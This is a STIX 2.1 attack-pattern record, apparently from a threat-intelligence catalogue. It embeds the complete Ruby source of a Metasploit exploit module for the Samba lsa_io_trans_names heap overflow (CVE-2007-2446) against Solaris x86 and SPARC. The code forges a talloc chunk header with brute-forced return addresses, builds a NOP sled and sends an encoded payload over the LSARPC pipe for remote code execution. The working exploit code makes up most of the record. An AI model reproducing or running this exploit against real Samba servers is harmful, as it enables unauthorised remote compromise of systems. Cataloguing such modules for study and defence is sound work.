{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7518e4b7-ca6d-410e-841b-97d261d965dc",
    "created": "2024-08-14T16:33:46.974244Z",
    "modified": "2024-08-14T16:33:46.974248Z",
    "name": "Samba lsa_io_trans_names Heap Overflow",
    "description": " This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the TALLOC chunk overwrite method (credit Ramon and Adriano), which only works with Samba versions 3.0.21-3.0.24. Additionally, this module will not work when the Samba \"log level\" parameter is higher than \"2\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/samba/lsa_transnames_heap.rb",
            "external_id": "lsa_transnames_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2446"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba lsa_io_trans_names Heap Overflow',\n      'Description'    => %q{\n        This module triggers a heap overflow in the LSA RPC service\n      of the Samba daemon. This module uses the TALLOC chunk overwrite\n      method (credit Ramon and Adriano), which only works with Samba\n      versions 3.0.21-3.0.24. Additionally, this module will not work\n      when the Samba \"log level\" parameter is higher than \"2\".\n      },\n      'Author'         =>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-2446'],\n          ['OSVDB', '34699'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n        },\n      'Platform'       => 'solaris',\n      'Targets'        =>\n        [\n          ['Solaris 8/9/10 x86 Samba 3.0.21-3.0.24',\n          {\n            'Platform'      => 'solaris',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64 * 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x082f2000 },\n                'Stop'  => { 'Ret' => 0x084f2000 },\n                'Step'  => 60 * 1024,\n              }\n          }\n          ],\n          ['Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24',\n          {\n            'Platform'      => 'solaris',\n            'Arch'          => [ ARCH_SPARC ],\n            'Nops'          => 64 * 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x00322000 },\n                'Stop'  => { 'Ret' => 0x00722000 },\n                'Step'  => 60 * 1024,\n              }\n          }\n          ],\n          ['DEBUG',\n          {\n            'Platform'      => 'solaris',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 64 * 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xaabbccdd },\n                'Stop'  => { 'Ret' => 0xaabbccdd },\n                'Step'  => 60 * 1024,\n              }\n          }\n          ],\n        ],\n      'DisclosureDate' => '2007-05-14',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use\", 'LSARPC']),\n      ])\n\n  end\n\n  # Need to perform target detection\n  def autofilter\n    false\n  end\n\n  def brute_exploit(target_addrs)\n\n    if(not @nops)\n      if (target['Nops'] > 0)\n        print_status(\"Creating nop sled....\")\n        @nops = make_nops(target['Nops'])\n      else\n        @nops = ''\n      end\n    end\n\n    print_status(\"Trying to exploit Samba with address 0x%.8x...\" % target_addrs['Ret'])\n\n    nops = @nops\n    pipe = datastore['SMBPIPE'].downcase\n\n    print_status(\"Connecting to the SMB service...\")\n    connect()\n    smb_login()\n\n    datastore['DCERPC::fake_bind_multi'] = false\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    num_entries  = 272\n    num_entries2 = 288\n\n    #\n    # First talloc_chunk\n    # 16 bits align\n    # 16 bits sid_name_use\n    #     16 bits uni_str_len\n    #     16 bits uni_max_len\n    #     32 bits buffer\n    # 32 bits domain_idx\n    #\n    buf = (('A' * 16) * num_entries)\n\n    # Padding\n    buf << 'A' * 8\n\n    # TALLOC_MAGIC\n    talloc_magic = \"\\x70\\xec\\x14\\xe8\"\n\n    # Second talloc_chunk header\n    buf << 'A' * 8                         # next, prev\n    buf << NDR.long(0) + NDR.long(0)       # parent, child\n    buf << NDR.long(0)                     # refs\n    buf << [target_addrs['Ret']].pack('V') # destructor\n    buf << 'A' * 4                         # name\n    buf << 'A' * 4                         # size\n    buf << talloc_magic                    # flags\n\n    stub = lsa_open_policy(dcerpc)\n\n    stub << NDR.long(0)            # num_entries\n    stub << NDR.long(0)            # ptr_sid_enum\n    stub << NDR.long(num_entries)  # num_entries\n    stub << NDR.long(0x20004)      # ptr_trans_names\n    stub << NDR.long(num_entries2) # num_entries2\n    stub << buf\n    stub << nops\n    stub << payload.encoded\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      # LsarLookupSids\n      dcerpc.call(0x0f, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError\n      print_status('Server did not respond, this is expected')\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      print_error('Server is most likely patched...')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      else\n        print_error(\"Error: #{e.class}: #{e}\")\n      end\n    end\n\n    handler\n    disconnect\n  end\n\n  def lsa_open_policy(dcerpc, server=\"\\\\\")\n    stubdata =\n      # Server\n      NDR.uwstring(server) +\n      # Object Attributes\n        NDR.long(24) + # SIZE\n        NDR.long(0)  + # LSPTR\n        NDR.long(0)  + # NAME\n        NDR.long(0)  + # ATTRS\n        NDR.long(0)  + # SEC DES\n          # LSA QOS PTR\n          NDR.long(1)  + # Referent\n          NDR.long(12) + # Length\n          NDR.long(2)  + # Impersonation\n          NDR.long(1)  + # Context Tracking\n          NDR.long(0)  + # Effective Only\n      # Access Mask\n      NDR.long(0x02000000)\n\n    res = dcerpc.call(6, stubdata)\n\n    dcerpc.last_response.stub_data[0,20]\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2007-05-14",
    "x_mitre_platforms": [
        "solaris'"
    ]
}